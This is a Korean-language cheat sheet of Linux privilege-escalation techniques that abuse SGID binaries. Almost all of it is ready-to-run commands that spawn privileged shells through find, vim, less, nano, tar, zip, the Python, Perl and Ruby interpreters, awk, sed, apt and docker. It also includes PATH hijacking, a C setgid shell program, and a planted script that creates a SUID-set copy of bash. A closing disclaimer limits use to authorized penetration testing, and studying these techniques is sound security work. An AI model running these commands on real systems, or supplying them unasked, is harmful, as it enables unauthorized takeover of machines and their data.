# SGID를 이용한 리눅스 권한 상승 기법 - 실전 명령어 모음

## 1. SGID 파일 찾기 명령어

```bash
# 모든 SGID 바이너리 찾기
find / -perm -2000 -type f 2>/dev/null

# SGID + 실행 권한 함께 있는 파일만 찾기
find / -perm -2000 -a -perm /111 -type f 2>/dev/null

# SGID가 설정된 디렉터리 찾기
find / -perm -2000 -type d 2>/dev/null

# SUID + SGID 동시 설정된 파일 찾기 (강력한 권한 상승 가능)
find / -perm -6000 -type f 2>/dev/null
```

## 2. 주요 SGID 바이너리 권한 상승 기법

### find

```bash
# find에 SGID 있을 때
/usr/bin/find . -exec /bin/sh -p \; -quit
# -p 플래그: 권한 유지 (privileged) 모드로 쉘 실행
```

### vim/vi

```bash
# vim에 SGID 있을 때
/usr/bin/vim -c ':!/bin/sh'
# 또는
vim
# vim 내에서:
:!/bin/bash
```

### bash

```bash
# bash에 SGID 있을 때
/bin/bash -p
# -p 옵션은 권한을 유지하는 옵션
```

### less/more/man

```bash
# less, more에 SGID 있을 때
/usr/bin/less /etc/passwd
!/bin/sh

# man 페이지도 내부적으로 less 사용
/usr/bin/man man
!/bin/sh
```

### nano

```bash
# nano에 SGID 있을 때
/usr/bin/nano
^R^X
reset; sh 1>&0 2>&0
# ^R^X는 Ctrl+R, Ctrl+X를 의미: 명령 실행
```

### cp

```bash
# cp에 SGID 있을 때
/usr/bin/cp /bin/bash /tmp/bash_sgid
chmod g+s /tmp/bash_sgid
/tmp/bash_sgid -p
```

## 3. 심화된 SGID 활용 기법

### nmap (구버전)

```bash
# 구버전 nmap에 SGID 있을 때
/usr/bin/nmap --interactive
nmap> !sh
# 취약한 버전만 해당됨 (5.21 이하)
```

### python/perl/ruby

```bash
# python에 SGID 있을 때
/usr/bin/python -c 'import os; os.setgid(0); os.system("/bin/bash")'

# perl에 SGID 있을 때
/usr/bin/perl -e 'use POSIX; setgid(0); exec "/bin/bash";'

# ruby에 SGID 있을 때
/usr/bin/ruby -e 'Process::GID.gain_privilege(0); exec "/bin/bash"'
```

### tar/zip/gzip

```bash
# tar에 SGID 있을 때
/usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# zip에 SGID 있을 때
TF=$(mktemp -d)
echo 'sh 0<&2 1>&2' > $TF/x.sh
chmod +x $TF/x.sh
/usr/bin/zip $TF/x.zip $TF/x.sh --unzip-command="sh -c ./x.sh"
```

### PATH 하이재킹

```bash
# SGID 바이너리가 절대 경로 없이 명령어(예: 'ls')를 호출할 때
strings /usr/bin/custom_sgid | grep "ls"

# /tmp에 악성 ls 만들기
echo -e '#!/bin/bash\n/bin/bash' > /tmp/ls
chmod +x /tmp/ls

# PATH 변경 후 실행
export PATH=/tmp:$PATH
/usr/bin/custom_sgid
```

### screen

```bash
# 특정 버전의 screen에 SGID 있을 때 (4.5.0 이하)
/usr/bin/screen -D -m -L /bin/bash
# 또는
/usr/bin/screen -D -m -c /tmp/.screenrc
# /tmp/.screenrc 내용: exec /bin/bash
```

## 4. 고급 SGID 활용 기법

### awk/sed/ed

```bash
# awk에 SGID 있을 때
/usr/bin/awk 'BEGIN {system("/bin/sh")}'

# sed에 SGID 있을 때
/usr/bin/sed -n '1e /bin/sh' /etc/passwd

# ed에 SGID 있을 때
/usr/bin/ed
!sh
```

### apt/apt-get

```bash
# apt/apt-get에 SGID 있을 때
/usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# 또는
/usr/bin/apt-get changelog apt
# 내부적으로 less를 호출하므로 !sh로 쉘 획득
```

### 기타 자주 악용되는 SGID 바이너리

```bash
# chsh에 SGID 있을 때 (shadow 그룹)
/usr/bin/chsh
# 암호 확인 후 쉘 변경, /etc/shadow 접근 권한 얻음

# crontab에 SGID 있을 때 (crontab 그룹)
/usr/bin/crontab -e
# 편집기에서 !sh나 외부 명령 실행 가능

# docker에 SGID 있을 때
/usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 새로운 SGID 바이너리 생성

```bash
# 내가 속한 그룹으로 SGID 바이너리 생성
echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(){\nsetgid(0);\nsystem("/bin/bash");\nreturn 0;\n}' > /tmp/sgidshell.c
gcc /tmp/sgidshell.c -o /tmp/sgidshell
chmod g+s /tmp/sgidshell
./tmp/sgidshell
```

## 5. SGID 디렉터리 활용 기법

```bash
# SGID가 설정된 디렉터리 찾기
find / -perm -g=s -type d 2>/dev/null

# SGID 디렉터리 내 스크립트 생성
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /sgid_directory/evil.sh
chmod +x /sgid_directory/evil.sh

# 만약 이 디렉터리가 cron 작업으로 접근된다면 권한 상승 가능
```

## 6. SGID 분석 명령어

```bash
# 바이너리 내부 명령어 패턴 확인
strings /usr/bin/sgid_binary | grep -E '/bin/|exec|system'

# 라이브러리 의존성 확인
ldd /usr/bin/sgid_binary

# strace로 시스템 호출 추적
strace -f -o /tmp/sgid_trace.txt /usr/bin/sgid_binary

# 권한 있는 그룹 확인
id -G
id -Gn

# 파일 시스템 그룹 권한 확인
find / -group <그룹이름> -type f 2>/dev/null
```

---

> 주의: 이 명령어들은 침투 테스트나 권한 있는 환경에서만 사용하세요.
> 무단으로 시스템에서 권한 상승을 시도하는 것은 불법이며 법적 처벌을 받을 수 있습니다.
